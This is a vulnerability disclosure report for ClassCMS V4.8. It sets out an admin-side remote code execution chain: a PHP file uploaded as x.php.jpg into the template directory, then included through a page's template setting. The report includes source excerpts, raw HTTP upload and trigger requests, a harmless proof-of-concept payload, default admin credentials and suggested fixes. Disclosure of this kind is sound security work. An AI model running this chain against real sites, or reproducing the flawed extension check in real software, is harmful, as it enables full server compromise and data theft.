# Remote Code Execution (RCE) Vulnerability Report

## Description
A Remote Code Execution (RCE) vulnerability exists in the backend model management module of ClassCMS V4.8. Two weaknesses in the backend combine into a full RCE:

1. The `file upload` custom field type lets the administrator choose the upload directory and the saved file name freely. The upload extension whitelist only inspects the **last** extension of the resulting file name, so a file name pattern such as `x.php(ext)` turns an uploaded `poc.jpg` into `x.php.jpg` and passes validation. The upload directory is not restricted either, so the file can be written into the template directory of the site application (`/class/template/`).
2. The page (route) management module lets the administrator set the `template file` of a page to any string. The template resolver only appends `.php` when the given name does not already contain `.php`, so `x.php.jpg` is used unchanged and the uploaded file is included by PHP.

An administrator who creates such a field, uploads a `.jpg` file that contains PHP code, and creates a page whose template file points to that upload, executes arbitrary PHP code on the server as soon as the new page is visited.

## Download URL
[https://github.com/ClassCMS/ClassCMS/releases/tag/v4.8](https://github.com/ClassCMS/ClassCMS/releases/tag/v4.8)

## Version
V4.8

## Tested Environment
- PHP
- Apache
- MySQL

## Affected Page
`/index.php/admin`

## Vulnerability Details

### 1. Arbitrary file write with a controlled file name and directory

The `file upload` input type exposes two free-text configuration options (`class/admin/input.php`, `admin_input::fileupload()`, `case 'config'`):

```php
array('configname'=>'目录','hash'=>'filepath','inputhash'=>'text','tips'=>'上传文件保存目录,如: /upload/(Y)(m)(d)/ 请确保此目录有写入权限,不填则为默认目录'),
      array('configname'=>'文件名','hash'=>'filename','inputhash'=>'text','tips'=>'保存的文件名,随机文件名:(rand).(ext) 固定文件名:logo.png 原始文件名:(filename).(ext),中文文件名可能无法访问'),
```

Both values are stored without any validation by `admin_column::editPost()` and are passed straight into the upload handler (`class/admin/input.php`, `case 'ajax'`):

```php
if($file_upload=C('cms:common:upload',$config['name'].'_layupload',$config['filepath'],$config['filename'])) {
```

`class/cms/common.php::upload()` expands the placeholders of the configured file name. `(ext)` is replaced with the extension of the uploaded file, so the pattern `x.php(ext)` turns `poc.jpg` into `x.php.jpg`:

```php
$replace_key=array('(ext)','(rand)','(filename)','(Y)','(y)','(m)','(d)','(H)','(h)','(i)','(s)');
...
$replace_value=array($file_ext,substr(md5(time().rand(1000000, 9999999).@$allfiles[$filekey]['tmp_name']),0,14),implode('.',$temp_arr),date('Y'),date('y'),date('m'),date('d'),date('H'),date('h'),date('i'),date('s'));
$allfiles[$filekey]['save_path']=str_replace($replace_key,$replace_value,$path);
$allfiles[$filekey]['save_name']=str_replace($replace_key,$replace_value,$filename);
```

`class/cms/common.php::uploadMove()` validates the extension of the resulting name by popping only the last segment, so `jpg` is checked while the `.php` segment in the middle of the name stays invisible. The configured directory is used unchecked as well:

```php
$temp_arr = explode(".", $filename);
$file_ext = strtolower(array_pop($temp_arr));
$uploadExt=C('this:common:uploadExt');
if(!in_array($file_ext,$uploadExt)) {
    return E('不允许的文件类型');
}
...
$allpath=$GLOBALS['C']['SystemRoot'].$path;
...
if(@copy($tempfile,$allpath)) {
```

The whitelist itself (`class/cms/common.php::uploadExt()`) contains `jpg` and no `php`:

```php
Return array('gif','jpg','jpeg','png','bmp','ico','blob','psd','webp','doc','docx','xls','xlsx','ppt','txt','zip','7z','gz','bz2','pdf','rar','tar','torrent','exe','apk','ipa','swf','flv','mp3','mp4','wav','wma','wmv','mid','avi','mpg','asf');
```

With the directory set to `/class/template/` and the file name pattern set to `x.php(ext)`, the upload is stored as `<webroot>/class/template/x.php.jpg`.

### 2. Arbitrary template file inclusion

The page (route) form exposes the template file of a page as a free-text input (`class/admin/template/route_edit.php`):

```html
<label class="layui-form-label">模板文件</label>
...
<input type="text" name="classview" value="{if isset($route.classview)}{$route.classview}{/if}" class="layui-input" >
...
<div class="layui-form-mid">选填,访问页面时,此应用{if isset($module.classhash)}({$module.classhash}){/if}下的模板文件将会被调用,后缀(.php)可不填</div>
```

`class/cms/route.php::addPost()` stores the value as it is:

```php
if(!isset($route_add_query['classview'])) {
    $route_add_query['classview']='';
}
if(empty($route_add_query['classfunction']) && empty($route_add_query['classview'])) {
    Return false;
}
```

`class/cms/cms.php::include_template()` appends `.php` only when the given name does not already contain the string `.php`, therefore `x.php.jpg` is used unchanged:

```php
if(stripos($template_config['file'],'.php')===false) {$template_config['file'].='.php';}
```

`class/cms/cms.php::nowView()` resolves the file inside the template root of the application that owns the model and includes it:

```php
$C_template_config['rootpath']=$GLOBALS['C']['SystemRoot'].$GLOBALS['C']['ClassDir'].DIRECTORY_SEPARATOR.$C_template_config['class'].DIRECTORY_SEPARATOR.$C_template_config['dir'];
$U_tempfile=include_template($C_template_config);
if($U_tempfile) {include($U_tempfile);}
```

For the `默认模板` application (`classhash=template`, `class/template/template.config`) no `template_dir` is configured, so the template root is `<webroot>/class/template/` — exactly the directory the uploaded file was written to. Visiting the page route includes `<webroot>/class/template/x.php.jpg`, and the PHP code inside the uploaded file is executed.

### Impact
Arbitrary PHP code execution on the web server, with the privileges of the web server process:

- read and write every file of the CMS installation, including the database configuration (`config.php`), the application code and the cached templates;
- full access to the MySQL database through the stored credentials, and therefore read, modify or delete all site content and all user accounts;
- execution of operating system commands, which gives complete control of the server and of every other application hosted on it;
- the uploaded file is reachable without any authentication, so the payload keeps running for every visitor of the page.

### Prerequisites
Backend access is required (`/index.php/admin`) with the permissions to manage the models, the fields and the pages of the `默认模板` application (`admin:column:*`, `admin:route:addPost`). ClassCMS installs the default administrator account as `admin` / `admin` (`class/cms/install.php`), so a default installation is directly exposed.

### Affected requests

| # | Action | Request |
|---|--------|---------|
| 1 | Create the `file` upload field | `POST /index.php/admin?do=admin:column:addPost` |
| 2 | Set the upload directory and file name of the field | `POST /index.php/admin?do=admin:column:ajax&formid=<field id>&confighash=filepath&csrf=<token>` (same for `confighash=filename`), `POST /index.php/admin?do=admin:column:editPost` |
| 3 | Upload the payload | `POST /index.php/admin?do=admin:formAjax&classcms_form_id=<field id>&csrf=<token>` (multipart field `upload_layupload`) |
| 4 | Create the page that includes the uploaded file | `POST /index.php/admin?do=admin:route:addPost` (`uri=/rec-test/`, `classview=x.php.jpg`) |
| 5 | Trigger the payload | `GET /rec-test/` |

## Proof of Vulnerability

1. Create the payload file `poc.jpg` with the following content:

   ```php
   <?php echo "RCE-POC-20261120"; ?>
   ```

2. Upload it through the `file` field created in step 3 of the reproduction. The field configuration of step 2 (`/class/template/` + `x.php(ext)`) turns the upload into `x.php.jpg` inside the template directory:

   ```http
   POST /index.php/admin?do=admin:formAjax&classcms_form_id=<field id>&csrf=<token> HTTP/1.1
   Host: 127.0.0.1
   Content-Type: multipart/form-data; boundary=--------------------------aBcD
   Accept: application/json, text/javascript, */*; q=0.01
   X-Requested-With: XMLHttpRequest
   Referer: http://127.0.0.1/index.php/admin?do=admin:article:edit&id=1

   ------------------------------aBcD
   Content-Disposition: form-data; name="upload_layupload"; filename="poc.jpg"
   Content-Type: image/jpeg

   <?php echo "RCE-POC-20261120"; ?>
   ------------------------------aBcD--
   ```

   Response:

   ```json
   {"url":"/class/template/x.php.jpg","filename":"x.php.jpg","error":0}
   ```

3. Create the page as described in step 10 of the reproduction (URL `/rec-test/`, template file `x.php.jpg`) and request it:

   ```http
   GET /rec-test/ HTTP/1.1
   Host: 127.0.0.1
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
   ```

   Response body:

   ```
   RCE-POC-20261120
   ```

   The output proves that the PHP code of the uploaded `x.php.jpg` was executed by the server.

## Steps to Reproduce

1. Log in to the backend at `/index.php/admin` (default credentials `admin` / `admin`).
![01-backend-login](01-backend-login.png)
2. Go to **模型管理** (Model Management) and click the **字段** (Fields) button of the **文章** (Article) model.
![02-model-list](02-model-list.png)
3. In the field list of the model, add a new field at the bottom of the table: 字段名 (field name) `file`, 标识 (identifier) `upload`, 类型 (type) **文件上传** (file upload), then click **增加字段** (Add Field).
![03-add-fileupload-field](03-add-fileupload-field.png)
4. The field was created (`file[upload]: 增加成功`), click **保存** (Save).
![04-field-added](04-field-added.png)
5. The new field `file` of type `文件上传` is now part of the model:
![05-field-list](05-field-list.png)
6. Click **修改** (Modify) on the `file` field:
![06-field-edit-basic](06-field-edit-basic.png)
7. Open the **字段配置** (Field Configuration) tab and set 目录 (directory) to `/class/template/` and 文件名 (file name) to `x.php(ext)`, then click **保存** (Save).
![07-field-config-dir-filename](07-field-config-dir-filename.png)
8. Go to **栏目管理** (Column Management) and click **管理** (Manage) on the **文章** (Article) model.
![08-column-list](08-column-list.png)
9. In the article list click **增加** (Add) to open the article form, which now contains the new `file` upload control.
![09-article-list](09-article-list.png)
10. Prepare a file named `poc.jpg` whose whole content is the following PHP code:

    ```php
    <?php echo "RCE-POC-20261120"; ?>
    ```

![10-poc-jpg-content](10-poc-jpg-content.png)
11. In the article form click the upload button of the `file` field and select `poc.jpg`:
![11-article-form-upload](11-article-form-upload.png)
12. The upload succeeds, the backend stored the file as `x.php.jpg` (the `x.php` prefix comes from the configured file name pattern, `jpg` from the extension of the uploaded file):
![12-upload-success-xphpjpg](12-upload-success-xphpjpg.png)
13. Fill the remaining fields (标题 / 关键词 / 描述, e.g. `test`) and click **增加** (Add).
![13-article-added](13-article-added.png)
14. Go back to **模型管理** and click the **页面** (Pages) button of the **文章** model.
![14-model-pages](14-model-pages.png)
15. In the page list click **增加页面** (Add Page):
![15-page-list](15-page-list.png)
16. Create the page with 网址 (URL) `/rec-test/`, 标识 (identifier) `test` and 模板文件 (template file) `x.php.jpg`, then click **增加** (Add).
![16-add-page-rec-test](16-add-page-rec-test.png)
17. Visit `http://127.0.0.1/rec-test/`. The page outputs `RCE-POC-20261120`, the PHP code of the uploaded `x.php.jpg` was executed on the server.
![17-rce-output](17-rce-output.png)

## Fix

- Reject every uploaded file whose name contains a dangerous extension in any segment, not only in the last one. In `class/cms/common.php::uploadMove()` add a check such as `preg_match('/\.(php\d*|phtml|phar|shtml|htaccess|user\.ini)/i', $filename)` and keep the whitelist check on the original uploaded name.
- Fix the upload directory to a non-executable directory (`/upload/`) and forbid the directory configuration from pointing at the application directories (`/class/`, `/cache/`); the directory can be selected only from a predefined list.
- Restrict the page template file (`classview`) to the template files that exist in the template directory of the application, verify that the resolved path stays inside that directory with a `realpath()` check, and require the resolved file to end with `.php`.
- Store the uploaded files with a random name and a fixed extension, and make sure the upload directory is not executed by the web server.
